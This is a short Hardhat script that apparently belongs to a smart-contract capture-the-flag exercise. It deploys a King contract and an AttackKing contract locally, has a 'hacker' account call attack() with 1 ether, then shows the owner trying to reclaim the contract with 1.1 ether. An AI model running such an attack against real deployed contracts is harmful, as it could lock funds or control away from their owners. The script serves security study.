const hre = require("hardhat");

async function main() {

  const [ownerDeployer, hacker] = await hre.ethers.getSigners();
  const provider = hre.ethers.provider;


  const King = await hre.ethers.getContractFactory("King");
  const king = await King.deploy();
  await king.deployed();

  const AttackKing = await hre.ethers.getContractFactory("AttackKing");
  const attackKing = await AttackKing.deploy();
  await attackKing.deployed();

  await attackKing.connect(hacker).attack(king.address, { value: hre.ethers.utils.parseEther("1") });

  await ownerDeployer.sendTransaction({
    to: king.address,
    value: hre.ethers.utils.parseEther("1.1"),
  });
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
